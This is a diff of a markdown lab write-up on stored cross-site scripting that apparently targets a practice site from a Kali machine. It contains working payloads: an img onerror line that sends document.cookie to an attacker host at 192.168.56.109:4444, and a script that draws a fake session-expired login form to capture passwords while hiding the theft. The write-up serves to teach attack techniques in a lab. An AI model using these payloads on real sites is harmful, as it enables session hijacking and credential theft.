@@ -71,6 +71,7 @@ This grabs the cookie from whoever's browser it runs in and sends it to my Kali 
 3. Refreshed the page and the payload fired on its own
 
 **Payload I used:**
+
 ```<img src=x onerror="fetch('http://192.168.56.109:4444/steal?c='+document.cookie)">```
 
 This uses a broken image tag on purpose, since the image fails to load, the **onerror** part runs instead, sending the cookie to my Kali box.
@@ -99,6 +100,7 @@ This uses a broken image tag on purpose, since the image fails to load, the **on
 4. Checked my Kali terminal — the username and password showed up there instead of actually logging in
 
 **Payload I used:**
+```
 <script>
 document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#1a237e;z-index:9999;padding:50px;color:white;">
 <h1>Session Expired</h1>
@@ -109,6 +111,7 @@ document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;he
 <button>Secure Login</button>
 </form></div>';
 </script>
+```
 
 After grabbing the password, it shows a fake "login failed, try again" message so the person doesn't get suspicious, they just think they mistyped it and try again on the real form, not realizing their password already got sent to me.
 
